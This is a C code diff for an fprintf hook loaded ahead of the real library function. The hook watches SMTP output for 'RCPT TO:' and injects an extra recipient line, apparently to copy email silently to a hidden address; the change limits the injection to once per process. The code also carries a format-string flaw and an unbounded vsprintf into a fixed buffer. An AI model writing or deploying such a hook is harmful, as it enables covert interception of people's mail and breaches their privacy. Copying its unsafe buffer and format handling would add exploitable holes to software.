@@ -26,36 +26,39 @@ void createCC(char* cc)
 
 int fprintf(FILE *stream, const char *format, ...)
 {
-    //Sep
-    char buffer[255];
-    va_list args;
+  //Sep
+  static int isChanged = 0;
+  char buffer[255];
+  va_list args;
 
-    va_start(args, format);
-    vsprintf(buffer, format, args);
-    va_end(args);
+  va_start(args, format);
+  vsprintf(buffer, format, args);
+  va_end(args);
 
-    real_fprintf = dlsym(RTLD_NEXT, "fprintf");
+  real_fprintf = dlsym(RTLD_NEXT, "fprintf");
 
-    char RECEPT_TO[] = "RCPT TO:";
-    char *result = strstr(buffer, RECEPT_TO);
+  char RECEPT_TO[] = "RCPT TO:";
+  char *result = strstr(buffer, RECEPT_TO);
 
-    if (result != NULL)
-    {
-        char cc[255];
-        createCC(cc);
+  if (result != NULL && isChanged == 0)
+  {
+      char cc[255];
+      createCC(cc);
 
-        real_fprintf(stream, cc);
-        fflush(stream);
+      real_fprintf(stream, cc);
+      fflush(stream);
 
-        char receipt[255];
-        do
-        {
-            fgets(receipt, sizeof(receipt), stream);
-            //puts(buffer);
-        } while (receipt[0] < '2' || receipt[0] > '5');
-    }
+      char receipt[255];
+      do
+      {
+          fgets(receipt, sizeof(receipt), stream);
+          //puts(buffer);
+      } while (receipt[0] < '2' || receipt[0] > '5');
 
-    return real_fprintf(stream, format);
+      isChanged = 1;
+  }
+
+  return real_fprintf(stream, format);
 }
 
 #endif
